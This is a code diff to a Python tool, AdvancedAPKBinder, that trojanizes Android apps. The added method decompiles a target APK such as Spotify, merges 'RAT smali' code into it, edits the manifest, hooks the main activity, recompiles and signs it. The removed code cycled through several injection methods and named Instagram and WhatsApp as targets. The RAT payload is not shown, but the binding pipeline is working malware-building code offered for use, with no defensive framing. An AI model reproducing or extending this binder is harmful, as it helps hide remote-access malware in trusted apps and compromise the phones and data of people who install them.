@@ -154,34 +154,62 @@ class AdvancedAPKBinder:
         else:
             return "runtime_injection"
     
-    def simple_apktool_binding(self, apk_path, server_ip, server_port):
-        """Simple APKTool binding for basic APKs"""
-        print("🔧 Using simple APKTool binding...")
+    def full_copy_binding(self, apk_path, smali_source_dir, server_ip, server_port, output_apk_path):
+        """
+        Binds the RAT into the target APK by copying all original files
+        and then merging the RAT smali files.
+        """
+        print("🔧 Using full copy binding method...")
         
-        temp_dir = tempfile.mkdtemp()
-        decoded_dir = os.path.join(temp_dir, "decoded")
+        self.temp_dir = tempfile.mkdtemp()
+        original_decoded_dir = os.path.join(self.temp_dir, "original_decoded")
+        output_decoded_dir = os.path.join(self.temp_dir, "output_decoded")
         
         try:
-            # Decompile
-            cmd = ['apktool', 'd', apk_path, '-o', decoded_dir, '-f']
-            subprocess.run(cmd, check=True)
+            # 1. Decompile original APK
+            print(f"🔩 Decompiling original APK: {apk_path}")
+            subprocess.run(['java', '-jar', 'apktool.jar', 'd', apk_path, '-o', original_decoded_dir, '-f'], check=True)
+
+            # 2. Create output directory and copy all original decoded files
+            print("- Copying original APK content...")
+            shutil.copytree(original_decoded_dir, output_decoded_dir)
             
-            # Inject RAT code
-            self.inject_rat_code(decoded_dir, server_ip, server_port)
+            # 3. Merge RAT smali files into the output directory
+            print("- Injecting RAT smali code...")
+            output_smali_dir = os.path.join(output_decoded_dir, "smali")
+            if os.path.exists(smali_source_dir):
+                shutil.copytree(smali_source_dir, output_smali_dir, dirs_exist_ok=True)
+
+            # 4. Modify AndroidManifest.xml
+            self.modify_manifest(os.path.join(output_decoded_dir, "AndroidManifest.xml"))
             
-            # Recompile
-            output_apk = os.path.join(temp_dir, "bound_app.apk")
-            cmd = ['apktool', 'b', decoded_dir, '-o', output_apk]
-            subprocess.run(cmd, check=True)
+            # 5. Hook into the main activity
+            self.hook_main_activity(output_decoded_dir)
+
+            # 6. Recompile the APK
+            print("- Recompiling final APK...")
+            recompiled_apk = os.path.join(self.temp_dir, "recompiled.apk")
+            subprocess.run(['java', '-jar', 'apktool.jar', 'b', output_decoded_dir, '-o', recompiled_apk], check=True)
             
-            return output_apk
-            
-        except Exception as e:
-            print(f"❌ Simple binding failed: {e}")
+            # 7. Sign the recompiled APK
+            print("- Signing APK...")
+            subprocess.run([
+                'apksigner', 'sign', '--ks', 'debug.keystore', 
+                '--ks-key-alias', 'androiddebugkey', '--ks-pass', 'pass:android',
+                '--out', output_apk_path, recompiled_apk
+            ], check=True)
+
+            print(f"✅ APK bound, signed, and saved to {output_apk_path}")
+            return output_apk_path
+
+        except subprocess.CalledProcessError as e:
+            print(f"❌ Binding failed: {e}")
             return None
         finally:
-            if os.path.exists(temp_dir):
-                shutil.rmtree(temp_dir)
+            if os.path.exists(self.temp_dir):
+                shutil.rmtree(self.temp_dir)
+
+
     
     def advanced_apktool_binding(self, apk_path, server_ip, server_port):
         """Advanced APKTool binding with multiple fallbacks"""
@@ -552,121 +580,21 @@ class AdvancedAPKBinder:
             print(f"⚠️ APK signing error: {e}")
             return apk_path
     
-    def bind_apk(self, apk_path, server_ip, server_port, output_path=None):
-        """Main binding function - tries all methods"""
-        print(f"🔥 ADVANCED APK BINDING STARTED")
-        print(f"📱 APK: {apk_path}")
-        print(f"🌐 Server: {server_ip}:{server_port}")
-        print("=" * 60)
-        
-        if not os.path.exists(apk_path):
-            print(f"❌ APK file not found: {apk_path}")
-            return None
-        
-        # Setup tools
-        self.setup_advanced_tools()
-        
-        # Analyze APK
-        analysis = self.analyze_apk_complexity(apk_path)
-        
-        # Choose binding method
-        method = self.choose_binding_method(analysis)
-        print(f"🎯 Selected binding method: {method}")
-        
-        # Try binding methods in order of complexity
-        methods = [
-            ("simple_apktool", self.simple_apktool_binding),
-            ("advanced_apktool", self.advanced_apktool_binding),
-            ("smali_injection", self.smali_injection_binding),
-            ("dex_manipulation", self.dex_manipulation_binding),
-            ("runtime_injection", self.runtime_injection_binding)
-        ]
-        
-        # Start with selected method, then try others as fallback
-        selected_index = next((i for i, (name, _) in enumerate(methods) if name == method), 0)
-        ordered_methods = methods[selected_index:] + methods[:selected_index]
-        
-        for method_name, method_func in ordered_methods:
-            print(f"\n🔄 Trying {method_name}...")
-            
-            try:
-                result_apk = method_func(apk_path, server_ip, server_port)
-                
-                if result_apk and os.path.exists(result_apk):
-                    print(f"✅ {method_name} successful!")
-                    
-                    # Sign APK
-                    signed_apk = self.sign_apk(result_apk)
-                    
-                    # Move to output location
-                    if output_path:
-                        shutil.move(signed_apk, output_path)
-                        final_apk = output_path
-                    else:
-                        final_apk = signed_apk
-                    
-                    print(f"🎉 BINDING COMPLETED SUCCESSFULLY!")
-                    print(f"📱 Output APK: {final_apk}")
-                    print(f"🔧 Method used: {method_name}")
-                    
-                    return final_apk
-                    
-            except Exception as e:
-                print(f"❌ {method_name} failed: {e}")
-                continue
-        
-        print("💀 ALL BINDING METHODS FAILED!")
-        print("📝 This APK may have advanced protection mechanisms")
-        return None
-
-def main():
-    print("🔥 ADVANCED UNIVERSAL APK BINDER")
-    print("Compatible with ALL modern APKs")
-    print("=" * 60)
     
-    # Example usage
+if __name__ == "__main__":
     binder = AdvancedAPKBinder()
     
-    # Test with different APK types
-    test_cases = [
-        {
-            "name": "Spotify",
-            "complexity": "Very High",
-            "expected_method": "runtime_injection"
-        },
-        {
-            "name": "Instagram", 
-            "complexity": "High",
-            "expected_method": "dex_manipulation"
-        },
-        {
-            "name": "WhatsApp",
-            "complexity": "High", 
-            "expected_method": "smali_injection"
-        },
-        {
-            "name": "Simple Apps",
-            "complexity": "Low",
-            "expected_method": "simple_apktool"
-        }
-    ]
-    
-    print("🎯 SUPPORTED APK TYPES:")
-    for case in test_cases:
-        print(f"   {case['name']}: {case['complexity']} complexity -> {case['expected_method']}")
-    
-    print("\n💡 USAGE:")
-    print("binder = AdvancedAPKBinder()")
-    print("result = binder.bind_apk('spotify.apk', '10.2.53.11', 12000)")
-    
-    print("\n✅ This system handles:")
-    print("   - Obfuscated APKs (ProGuard/R8)")
-    print("   - Large APKs (100MB+)")
-    print("   - Split APKs")
-    print("   - Anti-tampering protection")
-    print("   - Modern target SDKs (30+)")
-    print("   - Native libraries")
-    print("   - Complex app architectures")
+    # Simple inputs for testing
+    original_apk = "spotify.apk"
+    smali_source = "smali_templates" 
+    server_ip = "127.0.0.1"
+    server_port = "8080"
+    output_apk = "spotify_bound.apk"
 
-if __name__ == "__main__":
-    main()
+    if not os.path.exists(original_apk):
+        print(f"❌ Original APK not found: {original_apk}")
+    elif not os.path.exists(smali_source):
+        print(f"❌ Smali source directory not found: {smali_source}")
+    else:
+        # Use the new full_copy_binding method
+        binder.full_copy_binding(original_apk, smali_source, server_ip, server_port, output_apk)
